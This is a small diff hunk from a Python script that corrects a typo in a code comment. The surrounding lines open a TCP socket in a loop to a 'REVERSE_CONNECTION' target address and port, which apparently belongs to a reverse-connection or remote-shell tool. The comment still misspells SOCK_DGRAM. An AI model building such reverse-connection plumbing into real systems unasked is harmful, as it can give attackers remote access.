@@ -36,7 +36,7 @@ while True:
     import socket
     
     os.system('clear')
-    # Change socket.SOCK_STREM(TCP) to socket.SOCK_DRAM for UDP connection
+    # Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
     SOCKET_SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     SOCKET_SOCK.connect((REVERSE_CONNECTION.TARGET_IPADDRESS, REVERSE_CONNECTION.TARGET_PORT))
 
